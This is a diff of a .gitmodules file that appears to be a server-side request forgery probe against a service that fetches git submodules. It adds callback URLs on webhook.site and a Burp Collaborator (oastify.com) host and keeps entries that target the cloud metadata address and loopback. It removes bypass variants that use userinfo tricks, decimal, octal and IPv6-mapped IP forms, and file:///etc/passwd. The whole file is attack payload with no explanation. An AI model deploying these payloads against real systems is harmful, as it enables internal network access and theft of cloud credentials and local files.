@@ -1,6 +1,14 @@
+[submodule "webhook-detect"]
+    path = webhook-detect
+    url = http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/git-submodule-fetch
+
 [submodule "ssrf-test"]
     path = ssrf-test
     url = http://169.254.169.254/latest/meta-data/
+
+[submodule "burp-detect"]
+    path = burp-detect  
+    url = http://l2xnz18zf4mmtw8x8p4dqj8iixcklpnqq.oastify.com/submodule
 
 [submodule "localhost-test"]
     path = localhost-test
@@ -9,31 +17,3 @@
 [submodule "internal-test"]
     path = internal-test
     url = git://127.0.0.1/internal.git
-
-[submodule "ssh-imds"]
-    path = ssh-imds
-    url = git@169.254.169.254:repo.git
-
-[submodule "at-trick"]
-    path = at-trick
-    url = ssh://git@github.com@169.254.169.254/repo.git
-
-[submodule "userinfo-bypass"]
-    path = userinfo-bypass
-    url = http://github.com@169.254.169.254/latest/meta-data/
-
-[submodule "ipv6-mapped"]
-    path = ipv6-mapped
-    url = http://[::ffff:169.254.169.254]/latest/meta-data/
-
-[submodule "decimal-ip"]
-    path = decimal-ip
-    url = http://2852039166/latest/meta-data/
-
-[submodule "octal-ip"]
-    path = octal-ip
-    url = http://0251.0376.0251.0376/
-
-[submodule "file-protocol"]
-    path = file-protocol
-    url = file:///etc/passwd
